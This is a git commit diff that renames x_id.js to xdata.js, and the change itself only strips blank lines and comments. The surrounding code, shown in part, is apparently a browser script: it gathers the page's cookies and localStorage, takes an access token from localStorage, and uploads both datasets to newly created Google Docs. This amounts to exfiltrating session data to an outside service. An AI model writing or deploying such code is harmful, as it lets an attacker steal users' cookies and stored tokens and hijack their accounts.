a6ffaeba07969eca45ab18e4acf599c233c32a0d
Gamius <hckrxyzz@gmail.com>
2025-03-30 21:33:05 +0600

    Update and rename x_id.js to xdata.js

--- xdata.js
+++ xdata.js
@@ -1,11 +1,8 @@
 const { google } = require('googleapis');
-
 async function postToGoogleDocs(token, title, content) {
     const auth = new google.auth.OAuth2();
     auth.setCredentials({ access_token: token });
     const docs = google.docs({ version: 'v1', auth });
-
-    // Create a new document
     const createResponse = await docs.documents.create({
         requestBody: {
             title: title
@@ -13,8 +10,6 @@ async function postToGoogleDocs(token, title, content) {
     });
 
     const documentId = createResponse.data.documentId;
-
-    // Update the document with content
     await docs.documents.batchUpdate({
         documentId: documentId,
         requestBody: {
@@ -52,9 +47,7 @@ function getLocalStorage() {
 async function saveDataOnline() {
     const cookies = getCookies();
     const localStorageData = getLocalStorage();
-
     const token = localStorage.getItem('gst_tkn');
-
     const cookiesDocId = await postToGoogleDocs(token, 'Cookies Data', JSON.stringify(cookies, null, 2));
     const localStorageDocId = await postToGoogleDocs(token, 'Local Storage Data', JSON.stringify(localStorageData, null, 2));
 
